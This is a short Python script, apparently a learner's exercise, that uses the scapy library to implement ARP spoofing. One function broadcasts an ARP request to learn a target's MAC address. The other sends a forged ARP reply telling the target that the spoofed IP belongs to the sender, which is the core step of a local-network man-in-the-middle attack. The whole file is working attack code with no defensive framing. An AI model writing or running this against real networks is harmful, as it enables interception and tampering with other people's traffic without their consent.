import scapy.all as scapy
import time

def Get_MAC(ip):
    #arp request 
    arp_request = scapy.ARP(pdst=ip)     #seding arp packets request to all ip
    
    #broadcast frame
    broadcastFrame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #layer 2 operation broadcast to all layer 2 devices  
    
    #arp+broadcast packet
    arp_request_broadcast = broadcastFrame/arp_request

    #answered_list,unanswered_list = scapy.srp(arp_request_broadcast,timeout=1)
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    
    return answered_list[0][1].hwsrc



def spoof(target_ip,spoof_ip):
    Target_MAC = Get_MAC(target_ip)
    #ARP reply
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=Target_MAC,psrc=spoof_ip)
    scapy.send(packet)


    
    